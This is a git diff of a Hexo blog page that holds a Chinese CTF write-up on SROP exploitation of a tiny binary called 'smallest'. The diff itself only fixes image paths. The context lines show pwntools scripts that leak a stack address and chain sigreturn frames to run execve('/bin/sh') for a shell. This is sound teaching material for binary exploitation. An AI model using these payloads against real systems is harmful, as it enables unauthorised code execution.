@@ -23,17 +23,17 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="srop利用  所谓的srop，是rop的一种，被ctfwiki称为是高级栈溢出，它的利用手法，我挂出下面两个链接参考学习： SROP - CTF Wiki (ctf-wiki.org) https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1944y1J7fS&#x2F;?spm_id_from&#x3D;333.337.search-card.all.click 简单的来说呢，就是利用系统调用号为15">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//1.png">
-<meta property="og:image" content="http://example.com/.com//2.png">
-<meta property="og:image" content="http://example.com/.com//3.png">
-<meta property="og:image" content="http://example.com/.com//4.png">
-<meta property="og:image" content="http://example.com/.com//5.png">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/1.png">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/2.png">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/3.png">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/4.png">
+<meta property="og:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/5.png">
 <meta property="article:published_time" content="2024-06-11T10:59:53.000Z">
 <meta property="article:modified_time" content="2024-06-11T12:40:03.800Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="栈溢出">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/.com//1.png">
+<meta name="twitter:image" content="http://example.com/2024/06/11/srop%E5%88%A9%E7%94%A8/1.png">
   
   
   
@@ -287,17 +287,17 @@
 <p>简单的来说呢，就是利用系统调用号为15（64位）的系统调用，对所有的寄存器进行重新赋值，达到控制所有寄存器的目的，下面将讲解一道题目，对srop构建认知：</p>
 <p>题目链接：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1cYiWPoTO5FaavbMTy0Hgmw?pwd=uldz">https://pan.baidu.com/s/1cYiWPoTO5FaavbMTy0Hgmw?pwd=uldz</a><br>提取码：uldz </p>
 <p>好了，现在开始，我们来看题目，我们先checksec一下，并拖入IDA中：</p>
-<p><img src="/.com//1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
-<p><img src="/.com//2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/1.png" srcset="/img/loading.gif" lazyload alt="1"></p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
 <p>代码非常的短，几乎没有独立的片段供我们使用，很明显，可以看出，所调用的函数是read函数，整个代码，除了ret指令，没有对（栈顶）rsp做出移动的指令，这是不同于常规程序的，也就是说，读入的地方，也就是我们ret所返回的地方，因为没有bss段，也没有”&#x2F;bin&#x2F;sh”字符串，所以说，泄露栈地址，成了必要的条件（往里面写”&#x2F;bin&#x2F;sh”），想要执行write函数泄露栈地址，就必须使rax等于1，而我们溢出无论返回到程序哪里，都无法使rax等于1，但是，别忘了，我们有read函数，read函数执行完毕，会将读入的字节数写入到rax寄存器中，也就是说，让read函数读入一个字节，就可以了。该部分payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#sh = gdb.debug(&quot;./smallest&quot;,&quot;b *0x4000B0&quot;)</span><br>sh = process(<span class="hljs-string">&quot;./smallest&quot;</span>)<br><br>start_addr = <span class="hljs-number">0x4000B0</span><br>syscall_ret_addr = <span class="hljs-number">0x4000be</span><br>payload = p64(start_addr)*<span class="hljs-number">3</span><br>sh.send(payload)<br><br><span class="hljs-comment">#pause()</span><br>sh.send(<span class="hljs-string">b&quot;\xb8&quot;</span>)<br>sh.recv(<span class="hljs-number">8</span>)<br>stack_addr = u64(sh.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stack_addr----------&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(stack_addr))<br></code></pre></td></tr></table></figure>
 
 <p>下面，开始gdb调试之路：</p>
-<p><img src="/.com//3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/3.png" srcset="/img/loading.gif" lazyload alt="3"></p>
 <p>此时，已经将start_addr发送了三遍，并写在了栈上，上图可以看出，接下来，返回继续执行read函数，并发送”\xb8”：</p>
-<p><img src="/.com//4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/4.png" srcset="/img/loading.gif" lazyload alt="4"></p>
 <p>此时发送完成，rax成功等于1，同时由于我们发送了一个字节，所以，0x4000b0最后一个字节被覆盖，变成0x4000b8，指向函数发生改变，刚好绕过xor rax,rax指令，可谓非常的妙，接下里，write函数将泄露0x400个字节，我们选一个作为日后rsp指向的位置即可：</p>
-<p><img src="/.com//5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
+<p><img src="/2024/06/11/srop%E5%88%A9%E7%94%A8/5.png" srcset="/img/loading.gif" lazyload alt="5"></p>
 <p>执行完毕后，程序再次返回到read函数，接下来的payload如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python">sig = SigreturnFrame()<br>sig.rax = <span class="hljs-number">0</span><br>sig.rdi = <span class="hljs-number">0</span><br>sig.rsi = stack_addr<br>sig.rsp = stack_addr<br>sig.rdx = <span class="hljs-number">0x500</span><br>sig.rip = syscall_ret_addr<br><br>pause()<br>payload_2 = p64(start_addr) + <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x8</span>) + <span class="hljs-built_in">bytes</span>(sig)<br>sh.send(payload_2)<br><br>pause()<br>payload_3 = p64(syscall_ret_addr) + <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x7</span>)<br>sh.send(payload_3)<br><br>pause()<br>sign = SigreturnFrame()<br>sign.rax = <span class="hljs-number">59</span><br>sign.rdi = stack_addr + <span class="hljs-number">0x200</span><br>sign.rsi = <span class="hljs-number">0</span><br>sign.rdx = <span class="hljs-number">0</span><br>sign.rsp = stack_addr<br>sign.rip = syscall_ret_addr<br>payload_4 = p64(start_addr) + <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x8</span>) + <span class="hljs-built_in">bytes</span>(sign) + <span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x200</span>-<span class="hljs-number">0x8</span>-<span class="hljs-number">0x8</span>-<span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>(sign))) + <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>sh.send(payload_4)<br><br>pause()<br>payload_5 = p64(syscall_ret_addr) + <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x7</span>)<br>sh.send(payload_5 )<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
 
